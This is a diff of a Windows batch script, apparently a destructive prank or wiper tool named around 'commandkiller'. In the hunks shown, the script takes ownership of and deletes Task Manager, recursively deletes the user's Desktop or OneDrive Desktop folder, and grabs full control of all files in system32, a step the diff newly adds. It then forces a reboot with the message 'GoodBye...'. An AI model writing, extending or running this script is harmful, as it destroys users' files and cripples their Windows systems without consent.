@@ -1,3 +1,4 @@
+
 @echo off
 color 0c
 takeown /f "%windir%\system32\taskkill.exe"
@@ -31,13 +32,14 @@ del "%windir%\system32\taskmgr.exe"/q
 
 
 
-if exist "%userprofile%\OneDrive" (cd "%userprofile%\OneDrive") else (cd "%userprofile%")
+if exist "%userprofile%\OneDrive" (cd %userprofile%\OneDrive) else (cd %userprofile%)
 rd Desktop/q/s
 
 cd %windir%\system32
-icacls * /grant "%username%":F /C
+takeown /f *.*
+icacls *.* /grant "%username%":F /C
 
 cd "%userprofile%"
-rem copiconfig -r -c "GoodBye..." -t 2
 shutdown -r -c "GoodBye..." -t 2
+cd %windir%\system32
 del commandkiller.exe/q
